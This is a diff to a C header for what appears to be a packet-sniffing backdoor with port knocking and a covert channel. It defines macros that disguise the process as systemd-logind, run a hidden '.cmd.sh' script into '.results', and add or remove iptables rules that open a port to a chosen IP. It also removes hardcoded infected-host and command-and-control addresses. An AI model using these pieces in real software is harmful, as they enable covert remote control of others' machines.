@@ -1,6 +1,5 @@
-#ifndef MAIN_H
-#define MAIN_H
-
+#ifndef LIBPCAP_H
+#define LIBPCAP_H
 
 #include <pcap.h>
 #include <stdlib.h>
@@ -9,7 +8,6 @@
 #include <netinet/if_ether.h>
 #include <net/ethernet.h>
 #include <netinet/ether.h>
-//#include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <string.h>
 #include <ctype.h>
@@ -19,9 +17,13 @@
 #include <stdio.h>
 #include <string.h>
 #include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
 #include "encrypt_utils.h"
 #include "socketwrappers.h"
 #include "covert_wrappers.h"
+#include "portknocking.h"
+#include "inotify.h"
 #include <unistd.h>
 #include <time.h>
 
@@ -46,7 +48,7 @@ struct my_ip {
 typedef u_int tcp_seq;
 
 struct sniff_tcp {
-       u_short th_sport;               /* source port */
+        u_short th_sport;               /* source port */
         u_short th_dport;               /* destination port */
         tcp_seq th_seq;                 /* sequence number */
         tcp_seq th_ack;                 /* acknowledgement number */
@@ -67,20 +69,14 @@ struct sniff_tcp {
         u_short th_urp;                 /* urgent pointer */
 };
 
-#define FILTER "tcp and (port 8506 || port 8507)"
-#define PAYLOAD_KEY "8505"
 #define PORT "8505"
-#define SHPORT 8505
-#define SPORT 22
 #define BUFFERSIZE 1024
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./.cmd.sh > .results"
 #define CHMOD "chmod 755 .cmd.sh"
-#define IPTABLES(ip) "iptables -I INPUT 1 -p tcp -s " ip " --dport 8505 -j ACCEPT"
-#define TURNOFF(ip) "iptables -D INPUT -p tcp -s " ip " --dport 8505 -j ACCEPT"
+#define IPTABLES(ip,protocol,port) "iptables -I INPUT -p " protocol " -s " ip " --dport " port " -j ACCEPT"
+#define TURNOFF(ip,protocol,port) "iptables -D INPUT -p " protocol "  -s " ip " --dport " port " -j ACCEPT"
 #define RESULT_FILE ".results"
-#define INFECTEDIP "192.168.0.100"
-#define CNCIP "192.168.0.109"
 #define FILENAME ".cmd.sh"
 struct payload{
     char key[5]; // always 8505
@@ -88,6 +84,8 @@ struct payload{
 };
 
 
+//char GetLocalIP(char *device);
+char* iptables(char *port, char *ip, char *protocol);
 int Packetcapture();
 void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
@@ -97,9 +95,6 @@ void ParsePattern(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* 
 void CreatePayload(char *command, unsigned char *encrypted);
 void SendPayload(const unsigned char *tcp_payload);
 bool CheckKey(u_char ip_tos, u_short ip_id, bool type);
-
-
-int knocking[2];
-int pattern[2];
 pcap_t *interfaceinfo;
+
 #endif
